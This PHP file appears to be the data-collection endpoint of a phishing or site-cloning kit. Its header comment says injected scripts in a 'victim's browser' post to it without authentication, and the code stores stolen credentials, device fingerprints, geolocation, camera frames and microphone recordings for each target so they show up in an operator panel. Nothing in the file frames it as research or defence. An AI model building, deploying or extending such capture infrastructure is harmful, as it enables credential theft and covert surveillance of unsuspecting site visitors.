<?php
/**
 * api/capture.php — public ingestion endpoint hit by injected payload scripts
 * running in the victim's browser. Writes the captured data into the
 * matching target's storage so it shows up in the panel.
 *
 *   POST /api/capture.php?slug=<slug>&kind=device|geo|cred|consent|camera|mic
 *
 *   - device  : application/json body  → events table
 *   - geo     : application/json body  → events table
 *   - cred    : application/json body  → events table
 *   - consent : application/json body  → events table
 *   - camera  : raw base64 PNG (or {data: ...})  → captures/<ts>.png + media table
 *   - mic     : raw audio bytes (or {data: ...}) → audio/<ts>.webm + media table
 *
 * No auth: by design — visitor browsers must be able to POST here.
 * Slug is validated and constrained to the targets directory tree to
 * prevent path traversal.
 */

require_once __DIR__ . '/../lib/cloner.php';
require_once __DIR__ . '/../lib/store.php';

const CAPTURE_MAX_FRAMES    = 600;
const CAPTURE_MAX_CLIPS     = 240;
const CAPTURE_MAX_LOG_BYTES = 5 * 1024 * 1024;

$targets_root = realpath(__DIR__ . '/..') . '/targets';

$slug = strtolower((string) ($_GET['slug'] ?? ''));
$kind = (string) ($_GET['kind'] ?? '');

if (!cloner_valid_slug($slug)) {
    http_response_code(400);
    exit('bad slug');
}
if (!in_array($kind, ['device', 'geo', 'cred', 'consent', 'camera', 'mic'], true)) {
    http_response_code(400);
    exit('bad kind');
}

$target_dir = $targets_root . '/' . $slug;
if (!is_dir($target_dir)) {
    http_response_code(404);
    exit('no target');
}

$now = time();

if ($kind === 'device' || $kind === 'geo' || $kind === 'cred' || $kind === 'consent') {
    if (store_event_log_size($slug) >= CAPTURE_MAX_LOG_BYTES) {
        http_response_code(429);
        exit('log full');
    }
    $raw  = file_get_contents('php://input');
    $data = json_decode($raw ?: '', true);
    if (!is_array($data)) $data = ['raw' => mb_substr((string) $raw, 0, 4000)];

    store_event_add($slug, $kind, $data, $now);

    http_response_code(204);
    exit;
}

if ($kind === 'camera') {
    if (store_media_count($slug, 'camera') >= CAPTURE_MAX_FRAMES) {
        http_response_code(429);
        exit('frame cap reached');
    }
    $raw = file_get_contents('php://input');
    $b64 = $raw;

    if ($raw !== '' && $raw[0] === '{') {
        $j = json_decode($raw, true);
        if (is_array($j) && isset($j['data'])) $b64 = (string) $j['data'];
    }
    $b64 = preg_replace('/^data:image\/[^;]+;base64,/', '', (string) $b64);
    $bin = base64_decode($b64, true);
    if ($bin === false || strlen($bin) < 64) {
        http_response_code(400);
        exit('bad image');
    }
    if (strlen($bin) > 8 * 1024 * 1024) {
        http_response_code(413);
        exit('too large');
    }

    $name = sprintf('%d_%s.png', $now, substr(bin2hex(random_bytes(3)), 0, 6));
    @file_put_contents($target_dir . '/captures/' . $name, $bin, LOCK_EX);
    store_media_register($slug, 'camera', $name, strlen($bin), $now);

    http_response_code(204);
    exit;
}

if ($kind === 'mic') {
    if (store_media_count($slug, 'mic') >= CAPTURE_MAX_CLIPS) {
        http_response_code(429);
        exit('clip cap reached');
    }
    $raw = file_get_contents('php://input');
    if ($raw === '' || strlen($raw) > 16 * 1024 * 1024) {
        http_response_code(413);
        exit('too large or empty');
    }
    $name = sprintf('%d_%s.webm', $now, substr(bin2hex(random_bytes(3)), 0, 6));
    @file_put_contents($target_dir . '/audio/' . $name, $raw, LOCK_EX);
    store_media_register($slug, 'mic', $name, strlen($raw), $now);

    http_response_code(204);
    exit;
}
